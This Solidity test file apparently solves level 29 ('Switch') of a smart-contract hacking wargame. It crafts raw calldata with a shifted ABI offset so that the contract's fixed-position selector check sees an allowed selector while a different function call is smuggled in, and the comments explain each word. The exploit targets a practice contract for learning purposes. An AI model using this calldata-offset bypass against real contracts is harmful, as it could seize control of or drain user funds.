// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {SwitchFactory} from "../src/levels/29-SwitchFactory.sol";
import {Switch} from "../src/levels/29-Switch.sol";

contract SwitchSolution is BaseTest {

    function construction() internal override returns(address payable ) {
        return payable(address(new SwitchFactory()));
    }

    function solution(address payable target_) override internal {
      Switch target = Switch(target_);
      bytes memory legalCallData = 
        hex"30c13ade" 
        hex"0000000000000000000000000000000000000000000000000000000000000020"
        hex"0000000000000000000000000000000000000000000000000000000000000004"
        hex"20606e1500000000000000000000000000000000000000000000000000000000";
      (bool success, ) = address(target).call(
        // function selector for flipSwitch()
        hex"30c13ade" 
        // this is the 'head' part for the argument tuple, containing an offset
        // for where the content of the 'bytes _data' is stored
        // even though the function is *known* to only have one parameter, the
        // contract will eat this up and jump to where this heading points
        hex"0000000000000000000000000000000000000000000000000000000000000060"
        // this is just padding for the value the inline assembly reads. The
        // length for the byte array should be here, but it's never read
        hex"0000000000000000000000000000000000000000000000000000000000000000"
        // this is what calldatacopy(selector, 68, 4) reads. 
        hex"20606e1500000000000000000000000000000000000000000000000000000000"
        // bytes 4-36 point here, where the length of the bytes array is stored
        hex"0000000000000000000000000000000000000000000000000000000000000004"
        // this'll end up in the `bytes memory _data`
        hex"76227e1200000000000000000000000000000000000000000000000000000000"
      );
      require(success, "I borke it");
    }
}
